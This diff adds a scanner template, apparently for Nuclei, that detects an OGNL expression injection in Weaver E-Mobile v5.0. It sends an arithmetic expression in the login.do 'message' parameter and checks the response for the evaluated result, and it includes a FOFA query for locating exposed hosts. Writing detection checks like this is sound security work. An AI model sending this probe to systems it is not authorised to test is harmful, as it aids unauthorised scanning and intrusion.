@@ -1,0 +1,30 @@
+id: 泛微 E-Mobile-ognl注入
+
+info:
+  name: 泛微 E-Mobile 前台存在ognl表达式注入
+  severity: medium
+  description:  泛微OA E-mobile v5.0 ognl注入
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="泛微-EOffice"
+  tags: fanwei,ecology,exposure,config
+
+http:
+  - method: 
+      - GET
+    path:
+      - "{{BaseURL}}/login.do?message=1314999-666666"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "648333"
+        condition: and
+
+
+      - type: status
+        status:
+          - 200
